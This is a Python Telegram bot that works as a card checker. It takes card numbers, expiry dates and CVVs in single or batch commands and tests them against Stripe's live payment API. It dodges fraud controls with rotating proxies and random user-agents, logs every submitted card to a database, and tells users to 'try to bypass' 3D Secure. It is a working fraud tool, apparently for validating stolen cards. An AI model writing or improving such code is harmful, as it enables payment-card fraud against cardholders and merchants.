import os
import telebot
import requests
import fake_useragent
import random
import time
import json
from dotenv import load_dotenv
from server import MongoDBManager  # Import the MongoDBManager class from server.py
from ai import ProxyRotator, send_stripe_token_request, blogify, key, peck
from admin import allow_user, restrict_user, handle_messages, get_restricted_users, view_spam_alerts, blacklist_ip  # Import admin functions

# Load environment variables for security
load_dotenv()

# Initialize Telegram bot and MongoDB manager
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
STRIPE_PK_LIVE = os.getenv('STRIPE_PK_LIVE')
ADMIN_ID = os.getenv('ADMIN_ID')
AUTH_FILE_PATH = 'auth.txt'

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
db_manager = MongoDBManager(os.getenv('MONGO_URI'), 'users')

# Proxy Rotator
proxy_rotator = ProxyRotator('proxies.txt')

# Global payment status flag
pay = "0"


def is_user_allowed(user_id):
    """Check if a user is allowed by checking the auth file or admin status."""
    if not os.path.exists(AUTH_FILE_PATH):
        with open(AUTH_FILE_PATH, 'w') as f:
            pass  # Create an empty auth file if it doesn't exist

    with open(AUTH_FILE_PATH, 'r') as file:
        allowed_users = file.read().splitlines()
        return str(user_id) in allowed_users or user_id == int(ADMIN_ID)


def update_auth_file(user_id, action='allow'):
    """Update the auth file by allowing or restricting users."""
    with open(AUTH_FILE_PATH, 'r') as file:
        allowed_users = file.read().splitlines()

    if action == 'allow':
        if str(user_id) not in allowed_users:
            with open(AUTH_FILE_PATH, 'a') as file:
                file.write(f"{user_id}\n")
            return f"✅ User {user_id} has been added to the allowed list."
        else:
            return f"⚠️ User {user_id} is already allowed."
    elif action == 'restrict':
        if str(user_id) in allowed_users:
            allowed_users.remove(str(user_id))
            with open(AUTH_FILE_PATH, 'w') as file:
                file.write("\n".join(allowed_users) + "\n")
            return f"🚫 User {user_id} has been restricted."
        else:
            return f"⚠️ User {user_id} is not in the allowed list."


# Admin command to allow users
@bot.message_handler(commands=['allow_user'])
def admin_allow_user(message):
    if message.from_user.id == int(ADMIN_ID):
        try:
            user_id = message.text.split()[1]  # Extract user ID from the command
            response = update_auth_file(user_id, 'allow')
            bot.reply_to(message, response)
        except IndexError:
            bot.reply_to(message, "❌ Please provide a valid user ID.")
    else:
        bot.reply_to(message, "❌ You are not authorized to run this command.")


# Admin command to restrict users
@bot.message_handler(commands=['restrict_user'])
def admin_restrict_user(message):
    if message.from_user.id == int(ADMIN_ID):
        try:
            user_id = message.text.split()[1]
            response = update_auth_file(user_id, 'restrict')
            bot.reply_to(message, response)
        except IndexError:
            bot.reply_to(message, "❌ Please provide a valid user ID.")
    else:
        bot.reply_to(message, "❌ You are not authorized to run this command.")


# Command to check if the bot is responding
@bot.message_handler(commands=['start'])
def start_command(message):
    if is_user_allowed(message.from_user.id):
        bot.reply_to(message, "✅ Welcome! You are allowed to use this bot.")
    else:
        bot.reply_to(message, "❌ You are not authorized to use this bot.")


def format_response(card, result):
    """Format the payment result into a user-friendly message."""
    masked_card = f"{card[:4]} **** **** {card[-4:]}"  # Mask the card number for security
    if "Payment successful" in result:
        return f"✅ 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡\n💳 Card: {masked_card}\n🔍 Details: {result}"
    elif "3DS CARD" in result:
        return f"⚠️ 3𝘿 𝙎𝙚𝙘𝙪𝙧𝙚 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙\n\n💳 𝐂𝐂 -» {number}|{month}|{year}|{cvv} \n\n🔍 𝐒𝐭𝐚𝐭𝐮𝐬: 3D Secure Required.\n\n 𝙏𝙧𝙮 𝙩𝙤 𝙗𝙮𝙥𝙖𝙨𝙨, 𝙤𝙣 𝙞𝙣𝙗𝙪𝙞𝙡𝙩 𝙨𝙞𝙩𝙚 "
    else:
        return f"❌ 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙\n💳 Card: {masked_card}\n🔍 𝗘𝗿𝗿𝗼𝗿: {result}"


# Card check command
@bot.message_handler(commands=['chk'])
def check_single_card(message):
    if is_user_allowed(message.from_user.id):
        try:
            card_info = message.text.split()[1]  # Extract card details
            number, month, year, cvv = card_info.split('|')

            secretpi = blogify()  # Get fresh Stripe payment intent
            ua = fake_useragent.UserAgent().random  # Random user-agent
            peck()  # Ensure live proxy

            result = send_stripe_token_request(number, month, year, cvv, STRIPE_PK_LIVE, secretpi, ua)
            db_manager.log_card_check("card_checks", message.from_user.id, card_info, result)

            response = format_response(number, result)
            bot.reply_to(message, response)

        except Exception as e:
            db_manager.insert_log("errors", {"user_id": message.from_user.id, "error": str(e)})
            bot.reply_to(message, f"❌ Error: {str(e)}")
    else:
        bot.reply_to(message, "❌ You are not allowed to use this bot.")


# /mchk command for multiple card checks (Limited to 25 cards at once)
@bot.message_handler(commands=['mchk'])
def check_multiple_cards(message):
    if is_user_allowed(message.from_user.id):  # Check if user is allowed
        try:
            # Extract multiple card details from the message
            cards_info = message.text.split('\n')[1:]  
            
            # Check if the number of cards exceeds the limit (25 cards)
            if len(cards_info) > 25:
                bot.reply_to(message, "❌ You can only check up to 25 cards at a time. Please split your request.")
                return
            
            global pay
            secretpi = None

            # Loop through each card and process
            for loop_count, card_info in enumerate(cards_info, 1):
                number, month, year, cvv = card_info.split('|')

                # Refresh payment intent when necessary
                if loop_count % 9 == 0 or loop_count == 1 or pay == "1":
                    secretpi = blogify()
                    pay = "1"

                ua = fake_useragent.UserAgent().random
                peck()  # Ensure live proxy

                # Send Stripe payment request
                result = send_stripe_token_request(number, month, year, cvv, STRIPE_PK_LIVE, secretpi, ua)

                # Log each card check result in MongoDB
                db_manager.log_card_check("card_checks", message.from_user.id, card_info, result)

                # Format and send the result as a smart response
                response = format_response(number, result)
                bot.reply_to(message, response)

        except Exception as e:
            # Log the error in MongoDB
            db_manager.insert_log("errors", {"user_id": message.from_user.id, "error": str(e)})
            bot.reply_to(message, f"❌ Error: {str(e)}")
    else:
        bot.reply_to(message, "❌ You are not allowed to use this bot.")


# JWT handling command
@bot.message_handler(commands=['jwt'])
def handle_jwt(message):
    if is_user_allowed(message.from_user.id):
        try:
            auth_data = key()  # Fetch JWT token
            if 'token' in auth_data:
                db_manager.insert_log("jwt_requests", {"user_id": message.from_user.id, "token": auth_data['token']})
                bot.reply_to(message, f"🔑 JWT Token: {auth_data['token']}")
            else:
                bot.reply_to(message, "❌ Could not retrieve JWT token.")
        except Exception as e:
            db_manager.insert_log("errors", {"user_id": message.from_user.id, "error": str(e)})
            bot.reply_to(message, f"❌ Error: {str(e)}")
    else:
        bot.reply_to(message, "❌ You are not allowed to use this bot.")


# Handle all other messages
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    handle_messages(bot, message)  # Delegate to admin for handling


# Start the bot
bot.polling()